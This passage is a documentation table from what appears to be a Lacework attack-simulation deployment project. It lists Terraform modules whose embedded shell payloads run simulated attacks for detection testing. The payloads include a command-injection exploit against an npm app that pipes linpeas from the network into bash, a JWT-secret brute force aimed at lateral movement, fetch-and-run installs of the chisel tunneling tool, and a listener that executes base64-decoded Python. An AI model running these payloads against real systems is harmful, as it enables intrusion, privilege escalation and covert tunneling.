                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-ssm-execute-generate-web-traffic-attacker                         | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_attacker     | context.aws.ssm.attacker.execute.generate_web_traffic                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals \{<br/>    attack\_dir = &quot;/generate\-web\-traffic&quot;<br/>    curl\_urls = join\(&quot;\\n&quot;, \[ for url in var\.inputs\[&quot;urls&quot;\]: &quot;curl \-s \-\-retry 20 \-\-retry\-connrefused \-\-retry\-delay 60 \-\-connect\-timeout 5 &\#x27;$\{url\}&\#x27;; log \\&quot;curl $\{url\} result: $?\\&quot;&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log &quot;Enumerating urls\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;Running url enumeration:\\n$\{local\.curl\_urls\}&quot;<br/>        $\{local\.curl\_urls\}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-ssm-execute-exploit-npm-app                                       | ./modules/ssm/execute-exploit-npm-app                          | ssm_exec_exploit_npm_app                   | context.aws.ssm.attacker.execute.exploit_npm_app                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_npm_app": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "target_ip": null,<br/>                            "target_port": 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app                          | <pre>locals \{<br/>    attack\_dir = &quot;/npm\_attack&quot;<br/>    target\_ip=var\.inputs\[&quot;target\_ip&quot;\]<br/>    target\_port=var\.inputs\[&quot;target\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        log &quot;payload: curl \-\-get \-\-verbose \\&quot;http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices\\&quot; \-\-data\-urlencode &\#x27;name\[\]=\\$\($\{var\.inputs\[&quot;payload&quot;\]\}\)&\#x27;&quot;<br/>        log &quot;checking target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;<br/>        while \! nc \-z \-w 5 \-vv $\{local\.target\_ip\} $\{local\.target\_port\} &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;;<br/>            sleep 30;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available \- sending payload&quot;;<br/>        sleep 5;<br/>        curl \-\-get \-\-verbose &quot;http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices&quot; \-\-data\-urlencode &\#x27;name\[\]=$\($\{var\.inputs\[&quot;payload&quot;\]\}\)&\#x27; &gt;&gt; $LOGFILE 2&gt;&amp;1;<br/>        echo &quot;\\n&quot; &gt;&gt; $LOGFILE<br/>        log &quot;payload sent sleeping\.\.\.&quot;<br/>        log &quot;done&quot;;<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-ssm-execute-exploit-authapp                                       | ./modules/ssm/execute-exploit-authapp                          | ssm_exec_exploit_authapp                   | context.aws.ssm.attacker.execute.exploit_authapp                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_authapp": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_user_first_name": null,<br/>                            "compromised_user_last_name": null,<br/>                            "enabled": false,<br/>                            "target_ip": null,<br/>                            "target_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-authapp                          | <pre>locals \{<br/>    exploit\_script = &quot;bruteforce\_session\.py&quot;<br/>    usernames\_script = &quot;generate\_usernames\.py&quot;<br/>    attack\_dir = &quot;/authapp\_attack&quot;<br/>    target\_ip=var\.inputs\[&quot;target\_ip&quot;\]<br/>    target\_port=var\.inputs\[&quot;target\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    echo $\{base64gzip\(local\.exploit\)\} \| base64 \-d \| gunzip &gt; $\{local\.exploit\_script\}<br/>    echo $\{base64gzip\(local\.usernames\)\} \| base64 \-d \| gunzip &gt; $\{local\.usernames\_script\} <br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>    log &quot;installing required python3\.9\.\.\.&quot;<br/>    apt\-get install \-y python3\.9 python3\.9\-venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    python3\.9 get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;wait before using module\.\.\.&quot;<br/>    sleep 5<br/>    python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc<br/>    log &quot;installing exploit requirements\.\.\.&quot;<br/>    python3\.9 \-m pip install \-\-ignore\-installed \-r requirements\.txt<br/>    <br/>    curl \-LJ https://raw\.githubusercontent\.com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped\-JWT\-secrets\.txt \-o /tmp/scraped\-JWT\-secrets\.txt<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        log &quot;checking target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;<br/>        while \! nc \-z \-w 5 \-vv $\{local\.target\_ip\} $\{local\.target\_port\} &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;;<br/>            sleep 30;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available \- sending payload&quot;;<br/>        sleep 5;<br/>        <br/>        \# brute force the session password<br/>        python3\.9 $\{local\.exploit\_script\} \-\-host=$\{local\.target\_ip\} \-\-port=$\{local\.target\_port\} \-\-password\-list=/tmp/scraped\-JWT\-secrets\.txt \-\-output\-password\-list=/tmp/hydra\-passwords\.txt 2&gt;&amp;1 \| tee \-a $LOGFILE<br/><br/>        \# prep for second stage below providing usernames and password for lateral movement        <br/><br/>        \# result is hydra\-password list but we need a user list \- since external brute force isn&\#x27;t alerted on let&\#x27;s skip<br/>        \# python3\.9 $\{local\.usernames\_script\} \-\-first=$\{var\.inputs\[&quot;compromised\_user\_first\_name&quot;\]\} \-\-last=$\{var\.inputs\[&quot;compromised\_user\_last\_name&quot;\]\} \-\-output=/tmp/hydra\-users\.txt<br/>        USER\_NAME=&quot;$\(echo &quot;$\{var\.inputs\[&quot;compromised\_user\_first\_name&quot;\]\}&quot; \| tr &\#x27;\[:upper:\]&\#x27; &\#x27;\[:lower:\]&\#x27; \| cut \-c1\)$\(echo &quot;$\{var\.inputs\[&quot;compromised\_user\_last\_name&quot;\]\}&quot;\| tr &\#x27;\[:upper:\]&\#x27; &\#x27;\[:lower:\]&\#x27;\)&quot;<br/>        log &quot;username: $USER\_NAME&quot;<br/>        echo $USER\_NAME &gt; /tmp/hydra\-users\.txt<br/><br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/><br/>    exploit         = file\(<br/>                                &quot;$\{path\.module\}/resources/bruteforce\_session\.py&quot;, <br/>                            \)<br/>    requirements    = file\(<br/>                                &quot;$\{path\.module\}/resources/requirements\.txt&quot;, <br/>                            \)<br/>    usernames       = file\(<br/>                                &quot;$\{path\.module\}/resources/generate\_usernames\.py&quot;, <br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}<br/><br/></pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-ssm-listener-http-listener                                        | ./modules/ssm/listener-http-listener                           | ssm_exec_responder_http_listener           | context.aws.ssm.attacker.listener.http                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "listener": {<br/>                        "http": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener                           | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    mkdir \-p /tmp/www/<br/>    echo &quot;index&quot; &gt; /tmp/www/index\.html<br/>    mkdir \-p /tmp/www/upload/v2<br/>    echo &quot;upload&quot; &gt; /tmp/www/upload/v2/index\.html<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}&quot;<br/>        screen \-S http \-X quit<br/>        screen \-wipe<br/>        APPLOG=/tmp/http\_$SCRIPTNAME\.log<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$APPLOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>        mv $APPLOG &quot;$APPLOG\.1&quot; 2&gt;/dev/null \|\| true<br/>        screen \-d \-L \-Logfile /tmp/http\.log \-S http \-m python3 \-c &quot;import base64; exec\(base64\.b64decode\(&\#x27;$\{base64encode\(local\.app\)\}&\#x27;\)\)&quot;<br/>        screen \-S http \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode\(templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py\.tpl&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)\)<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-ssm-responder-port-forward                                        | ./modules/ssm/responder-port-forward                           | ssm_exec_responder_port_forward            | context.aws.ssm.attacker.responder.port_forward                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "port_forward": {<br/>                            "enabled": false,<br/>                            "listen_port": 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward                           | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        killall \-9 chisel<br/>        truncate \-s 0 /tmp/chisel\.log<br/>        log &quot;checking for chisel\.\.\.&quot;<br/>        while \! command \-v chisel; do<br/>            log &quot;chisel not found \- installing&quot;<br/>            curl https://i\.jpillora\.com/chisel\! \| bash<br/>            sleep 10<br/>        done<br/>        log &quot;chisel: $\(command \-v  chisel\)&quot;<br/>        /usr/local/bin/chisel server \-v \-p $\{local\.listen\_port\} &gt; /tmp/chisel\.log 2&gt;&amp;1 &amp;<br/>        log &quot;responder started\.\.\.&quot;<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
